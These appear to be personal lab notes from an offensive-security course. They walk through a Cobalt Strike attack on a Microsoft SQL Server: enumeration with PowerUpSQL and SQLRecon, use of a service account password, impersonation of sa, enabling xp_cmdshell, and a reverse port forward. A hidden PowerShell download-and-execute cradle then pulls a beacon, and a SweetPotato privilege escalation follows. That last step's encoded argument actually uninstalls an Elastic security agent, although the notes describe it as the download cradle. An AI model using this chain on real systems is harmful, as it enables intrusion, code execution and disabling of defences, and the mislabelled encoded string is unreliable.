https://github.com/NetSPI/PowerUpSQL
```
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powershell Get-SQLInstanceDomain

ComputerName     : sql-2.dev.cyberbotic.io
Instance         : sql-2.dev.cyberbotic.io,1433
DomainAccountSid : 1500000521000672332383313895871914512914091400
DomainAccount    : mssql_svc
DomainAccountCn  : MS SQL Service
Service          : MSSQLSvc
Spn              : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
LastLogon        : 8/15/2022 7:55 PM
Description      :
```

```
`Get-SQLConnectionTest` can be used to test whether or not we can connect to the database.

beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

ComputerName : sql-2.dev.cyberbotic.io
Instance     : sql-2.dev.cyberbotic.io,1433
Status       : Accessible
```
Then use `Get-SQLServerInfo` to gather more information about the instance.
```
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

ComputerName           : sql-2.dev.cyberbotic.io
Instance               : SQL-2
DomainName             : DEV
ServiceProcessID       : 2668
ServiceName            : MSSQLSERVER
ServiceAccount         : DEV\mssql_svc
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Standard Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : DEV\bfarmer
IsSysadmin             : No
ActiveSessions         : 1
```
SQLRecon can also enumerate servers via SPNs and fetch information about the instance with the `info` module.
```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

[*] Looking for MSSQL SPNs ...
[*] 1 found.

 |-> ComputerName:  sql-2.dev.cyberbotic.io
 |-> Instance:      sql-2.dev.cyberbotic.io:1433
 |-> AccountSid:    S-1-5-21-569305411-121244042-2357301523-1115
 |-> AccountName:   mssql_svc
 |-> AccountCn:     MS SQL Service
 |-> Service:       MSSQLSvc
 |-> SPN:           MSSQLSvc/sql-2.dev.cyberbotic.io:1433
 |-> LastLogon:     1/24/0423 12:48:15 PM
 
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

[*] Extracting SQL Server information from sql-2.dev.cyberbotic.io

 |-> ComputerName:           SQL-2
 |-> DomainName:             DEV
 |-> ServicePid:             4388
 |-> ServiceName:            MSSQLSERVER
 |-> ServiceAccount:         DEV\mssql_svc
 |-> AuthenticationMode:     Windows Authentication
 |-> ForcedEncryption:       0
 |-> Clustered:              No
 |-> SqlServerVersionNumber: 15.0.2000.5
 |-> SqlServerMajorVersion:  2019
 |-> SqlServerEdition:       Standard Edition (64-bit)
 |-> SqlServerServicePack:   RTM
 |-> OsArchitecture:         X64
 |-> OsVersionNumber:        2022
 |-> CurrentLogin:           DEV\bfarmer
 |-> IsSysAdmin:             No
 |-> ActiveSessions:         1
 ```


## Exploit

Find user authenticated
Finding a user (or group) that does have access can be challenging, because without the ability to query the SQL instance to ask it, you can be stuck guessing.  One port of call is to look for appropriately named domain groups and their members.
```
beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

GroupName     MemberName
---------     ----------
MS SQL Admins jking
```

OR GO AFTER mssql_svc
```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /i:sa /h:sql-2.dev.cyberbotic.io,1433 /m:whoami

[*] Determining user permissions on sql-2.dev.cyberbotic.io,1433
[*] Logged in as DEV\mssql_svc
[*] Mapped to the user dbo
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
 ```

### Get RCE
Impersonate user
```
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate

[*] Enumerating accounts that can be impersonated on sql-2.dev.cyberbotic.io,1433
name | 
-------
DEV\mssql_svc |
```
Enable xp_cmdshell with sa user
```
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:sa

[*] Enabling xp_cmdshell as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433
[+] SUCCESS: Enabled xp_cmdshell on sql-2.dev.cyberbotic.io,1433.
name | value | 
---------------
xp_cmdshell | 1 |

beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig

[*] Executing 'ipconfig' as 'DEV\mssql_svc' on sql-2.dev.cyberbotic.io,1433.
output | 
---------
 | 
Windows IP Configuration | 
 | 
 | 
Ethernet adapter Ethernet: | 
 | 
   Connection-specific DNS Suffix  . : ec2.internal | 
   IPv4 Address. . . . . . . . . . . : 10.10.122.25 | 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0 | 
   Default Gateway . . . . . . . . . : 10.10.122.1 | 
 |
```

## Port Forward to get shell
With command execution, we can work towards executing a Beacon payload.  As with other servers in the lab, the SQL servers cannot talk directly to our team server in order to download a hosted payload.  Instead, we must setup a reverse port forward to tunnel that traffic through our C2 chain.
```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\bfarmer (admin)

beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```
Next, host `smb_x64.ps1` at `/b` on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server.
```
beacon> portscan 10.10.122.25 445
(ICMP) Target '10.10.122.25' is alive. [read 8 bytes]
10.10.122.25:445 (platform: 500 version: 10.0 name: SQL-2 domain: DEV)
Scanner module is complete
```
  
We can now download and execute the payload, for example:
```
powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"

OR

powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
```
  
Keep an eye on your web log so you know when the payload has been fetched.
```
01/05 15:09:07 visit (port 80) from: 127.0.0.1
	Request: GET /b
	page Serves /home/attacker/cobaltstrike/uploads/smb_x64.ps1
	null
```
  
You can then link to the Beacon.
```
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337
[+] established link to child beacon: 10.10.122.25
```


Privesc
```
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc IgBDADoAXABQAHIAbwBnAHIAYQBtACAARgBpAGwAZQBzAFwARQBsAGEAcwB0AGkAYwBcAEEAZwBlAG4AdABcAGUAbABhAHMAdABpAGMALQBhAGcAZQBuAHQALgBlAHgAZQAiACAAdQBuAGkAbgBzAHQAYQBsAGwAIAAtAC0AZgBvAHIAYwBlAA=="
```
the enc string is generated from:

```
PS C:\Users\IñakiTornos> $str = 'iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')'
PS C:\Users\IñakiTornos> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
PS C:\Users\IñakiTornos> powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA==
```

![[Pasted image 20240921233604.png]]
